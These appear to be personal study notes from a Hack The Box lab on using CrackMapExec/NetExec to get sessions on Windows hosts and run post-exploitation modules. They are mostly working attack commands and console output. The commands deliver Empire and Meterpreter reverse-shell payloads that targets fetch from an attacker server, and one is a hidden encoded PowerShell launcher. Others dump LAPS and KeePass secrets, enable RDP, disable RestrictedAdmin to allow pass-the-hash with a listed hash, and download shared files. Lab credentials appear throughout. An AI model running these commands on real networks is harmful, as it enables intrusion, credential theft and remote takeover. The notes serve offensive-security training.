- I iwill paste this the other notes.,

---

# Getting Sessions in a C2 Framework
### With Empire C2 Frameware
First you need to install and configure the empire C2 framework
Then configure the NXC too, to lave the same credentials
- Run your C2 Framework
```
poetry run python empire.py client --config empire/client/config.yaml         
```
Start the listener, and run the nxc with the bellow Modulle
```
crackmapexec smb 10.129.204.133 -u robert -p 'Inlanefreight01!' -M empire_exec -o LISTENER=http
```

### With Metasploit Framework
We can do the same on metasploit using NXC module `web_delivery`. 
#### Metasploit configuration
```
alihussainzada@htb[/htb]$ msfconsole

<SNIP>

msf6 > use exploit/multi/script/web_delivery
[*] Using configured payload python/meterpreter/reverse_tcp
msf6 exploit(multi/script/web_delivery) > set SRVHOST 10.10.14.33
SRVHOST => 10.10.14.33
msf6 exploit(multi/script/web_delivery) > set SRVPORT 8443
SRVPORT => 8443
msf6 exploit(multi/script/web_delivery) > set target 2
target => 2
msf6 exploit(multi/script/web_delivery) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/script/web_delivery) > set LHOST 10.10.14.33
LHOST => 10.10.14.33
msf6 exploit(multi/script/web_delivery) > set LPORT 8002
LPORT => 8002
msf6 exploit(multi/script/web_delivery) > run -j
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.
msf6 exploit(multi/script/web_delivery) > 
[*] Started reverse TCP handler on 10.10.14.33:8002 
[*] Using URL: http://10.10.14.33:8443/2S1jAHS
[*] Server started.
[*] Run the following command on the target machine:
powershell.exe -nop -w hidden -e WwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQ
```
- Run the NXC with the command bellow:
```
alihussainzada@htb[/htb]$ crackmapexec smb 10.129.204.133 -u robert -p 'Inlanefreight01!' -M web_delivery -o URL=http://10.10.14.33:8443/2S1jAHS
```
---

# Popular Modules
### LDAP Module - get-network
- Query the domain DNS records, just like DNS zones
```
alihussainzada@htb[/htb]$ crackmapexec ldap dc01.inlanefreight.htb -u julio -p Password1 -M get-network -o ALL=true
```

### LDAP Module - laps
- Query the passwords of computers a user has access to:
```
Inlanefreight01! -M laps
```

### LDAP Module - MAQ
- Query the number of computer accounts that a user is allowed to create in a domain:
```
alihussainzada@htb[/htb]$ crackmapexec ldap dc01.inlanefreight.htb -u robert -p 'Inlanefreight01!' -M maq
```

### LDAP Module - daclread
- allows us to read and export the [DACLs](https://learn.microsoft.com/en-us/windows/win32/secauthz/dacls-and-aces) of one or multiple objects.
```
alihussainzada@htb[/htb]$ crackmapexec ldap dc01.inlanefreight.htb -u '' -p '' -M daclread -o TARGET=grace ACTION=read
```


## SMB Protocol Modules
### SMB Module - keepass_discover
- Helps to discover the keepass db: (Man it checks the process)
```
alihussainzada@htb[/htb]$ crackmapexec smb 10.129.203.121 -u julio -p Password1 -M keepass_discover
```

```
alihussainzada@htb[/htb]$ crackmapexec smb 10.129.203.121 -u julio -p Password1 -M keepass_trigger -o ACTION=ALL KEEPASS_CONFIG_PATH=C:/Users/julio/AppData/Roaming/KeePass/KeePass.config.xml 
```

### SMB Modules - get_netconnections and ioxidresolver
#### get_netconnections Module
- Shows the Network IPs (with IP6)
```
alihussainzada@htb[/htb]$ crackmapexec smb 10.129.203.121 -u julio -p Password1 -M get_netconnections
```

#### ioxidresolver Module
- module uses RPC to query IP addresses
```
alihussainzada@htb[/htb]$ crackmapexec smb 10.129.203.121 -u julio -p Password1 -M ioxidresolver
```

### SMB Modules - Enabling RDP
- If the machine we want to connect doesn't have RDP enabled, we can use the module `RDP` to allow it.
```
alihussainzada@htb[/htb]$ crackmapexec smb 10.129.203.121 -u julio -p Password1 -M rdp --options
```



# Skill Assessment
- Commands needed:
```
nxc smb 10.129.204.182 -u Administrator -H aa8058d010273e4a9c5043280a84b2bb --local-auth -x 'reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f'
```
- Then
```
xfreerdp3 /u:administrator /pth:'aa8058d010273e4a9c5043280a84b2bb' /v:10.129.204.182 /cert:ignore +clipboard +dynamic-resolution /drive:share,/tmp
```

- Find this too:
```
nxc smb 172.16.15.3 -u atul -p hooters1 -M spider_plus -o DOWNLOAD_FLAG=TRUE
```
